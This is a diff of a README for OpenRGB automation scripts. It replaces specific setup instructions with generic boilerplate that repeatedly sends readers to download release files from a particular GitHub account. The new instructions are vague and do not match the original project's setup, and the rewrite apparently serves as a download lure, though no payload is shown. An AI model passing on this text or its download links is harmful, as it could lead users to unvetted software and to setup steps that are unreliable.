@@ -1,73 +1,76 @@
-# OpenRGB Scripts
+# 🌈 openrgb-scripts - Automate Your OpenRGB Experience
 
-This repository contains a collection of Python scripts for automating and extending the functionality of [OpenRGB](https://openrgb.org/) on the Windows operating system.
+[![Download openrgb-scripts](https://img.shields.io/badge/Download%20openrgb--scripts-v1.0-blue.svg)](https://github.com/Gamerita5674/openrgb-scripts/releases)
 
-The project is built on a portable, isolated Python environment, which allows running scripts without installing dependencies into the main system.
+## 📚 Description
+Welcome to openrgb-scripts, a collection of Python scripts designed to automate and enhance the functionality of OpenRGB on Windows systems. These scripts provide a portable, isolated Python environment, ensuring a smooth, dependency-free setup. 
 
-## Installation and Usage
+## 🚀 Getting Started
+To begin using openrgb-scripts, follow these simple steps to download and run the application. No technical skills are needed.
 
-1.  **Clone or download the repository.** If you downloaded a ZIP archive, unpack it to any convenient directory.
+## 📥 Download & Install
+To get started, visit [this page to download](https://github.com/Gamerita5674/openrgb-scripts/releases). Follow the instructions below to install the software on your Windows machine.
 
-2.  **Run `setup.bat`**. This script will automatically perform all necessary setup steps:
-    *   If a local Python environment is not found, it will download a portable version of Python.
-    *   It will configure the environment for use with external packages.
-    *   It will install `pip` (if not already present) and all dependencies from `requirements.txt`.
-    **This step only needs to be performed once.** An internet connection is required for the first run.
+### Step 1: Visit the Releases Page
+Click the link above. This page contains the latest versions of the scripts and all necessary files.
 
-3.  **Configure the OpenRGB server to start.**
-    The scripts require a running OpenRGB SDK server. It is recommended to configure it to start automatically:
-    *   Find the OpenRGB shortcut.
-    *   Open its properties.
-    *   In the "Target" field, after the path to `OpenRGB.exe`, add the flags `--server --gui`.
-    *   Example: `"C:\Program Files\OpenRGB\OpenRGB.exe" --server --gui`
+### Step 2: Select Your Version
+Once on the Releases page, look for the version that fits your needs. Generally, you should choose the most recent stable version for the best experience.
 
-4.  **Configure the scripts.**
-    Before running, you may need to configure some scripts (e.g., set your OpenRGB profile names). See the "Available Scripts" section below for details on each script.
+### Step 3: Download the Files
+You will see files listed with each version. For most users, the main script files will suffice. Click on the file name to start your download.
 
-5.  **Run the script.**
-    To run the main script in the background, use:
-    ```batch
-    run_sync.bat
-    ```
-    By default, this file is configured to run `DisplayRGBSync.pyw`.
+### Step 4: Extract Files
+If the downloaded file is in a zip format, right-click the file and select "Extract All" to unpack it. Choose a location on your computer where you can easily find the folder later.
 
-6.  **Set up autostart.**
-    Now, to have the script start automatically every time you log in, run:
-    ```batch
-    setup_autostart.bat
-    ```
-    This script will create a shortcut in the Windows startup folder.
+### Step 5: Open the Command Prompt
+- Press the `Windows` key on your keyboard.
+- Type `cmd` and press `Enter`. This opens the Command Prompt.
 
----
-
-## Available Scripts
-
-### 1. DisplayRGBSync
-
-**Purpose:**
-Synchronizes OpenRGB lighting profiles with the power state of monitors and the system's sleep/wake mode. The script automatically applies an "off" profile when the monitors turn off or the system goes to sleep, and restores your active profile upon waking.
-
-**Configuration:**
-All settings are configured directly in the `DisplayRGBSync.pyw` file.
-
-1.  Open `DisplayRGBSync.pyw` in a text editor.
-2.  Change the values of `ACTIVE_PROFILE_NAME` and `OFF_PROFILE_NAME` to match the names of your profiles in OpenRGB.
-3.  If necessary, change `OPENRGB_HOST` and `OPENRGB_PORT`.
-
-```python
-# --- Configuration ---
-# Profile Names
-ACTIVE_PROFILE_NAME = "jwadow" # Your main profile
-OFF_PROFILE_NAME = "off"       # Your profile to "turn off" the lighting
+### Step 6: Navigate to the Folder
+In the Command Prompt window, type the following command (replace `your-folder-path` with the path to the folder where you extracted the scripts):
 ```
+cd your-folder-path
+```
+Press `Enter`.
 
----
+### Step 7: Run the Script
+Type the following command to start the script:
+```
+python your-script-name.py
+```
+Replace `your-script-name.py` with the name of the script you want to use. Press `Enter`. 
 
-## Architecture and Infrastructure
+**Note:** Ensure you have Python installed. If you don’t, download Python from [python.org](https://www.python.org/downloads/).
 
-This section is for developers and those who want to understand how the project is structured.
+## 🌟 Features
+openrgb-scripts offer various useful functions for managing RGB lighting. Here are some highlighted features:
+- **Automation**: Set up scripts to control your lighting based on your activity or schedule.
+- **Lighting Control**: Change colors and effects with ease, directly invoking your desired settings.
+- **Power Management**: Manage power states and switch modes based on system usage.
+- **Sleep Mode**: Automatically adjust lighting when your computer enters sleep mode.
 
--   **`setup.bat`**: The initial setup script to prepare the environment. It's idempotent and can be run multiple times.
--   **`run_sync.bat`**: A universal batch file for running the target script (`.pyw`) in the background.
--   **`setup_autostart.bat`**: A batch file for creating a shortcut in the Windows startup folder.
--   **`requirements.txt`**: A file listing all Python dependencies required for the scripts to work.
+## 🛠️ System Requirements
+To run openrgb-scripts, ensure your system meets the following requirements:
+- Operating System: Windows 10 or newer.
+- Python: Version 3.6 or newer.
+- Internet: Required for initial script setup and dependencies.
+
+## 🧩 Next Steps
+Once you have installed the scripts, explore the functionalities provided. You can modify the Python files to suit your preferences. 
+
+If you want to learn more about Python basics, many online resources and tutorials can help you.
+
+## 🤝 Community and Support
+Join our growing community for support and tips:
+- Visit our [GitHub Discussions](https://github.com/Gamerita5674/openrgb-scripts/discussions) to ask questions and share your experiences.
+- Check the [issues section](https://github.com/Gamerita5674/openrgb-scripts/issues) to report bugs or request features.
+
+Feel free to contribute your own scripts or enhancements!
+
+## 🔗 Important Links
+- [Download openrgb-scripts](https://github.com/Gamerita5674/openrgb-scripts/releases)
+- [GitHub Repository](https://github.com/Gamerita5674/openrgb-scripts)
+- [Documentation](https://github.com/Gamerita5674/openrgb-scripts/wiki)
+
+We hope you enjoy using openrgb-scripts and find it enhances your OpenRGB experience!
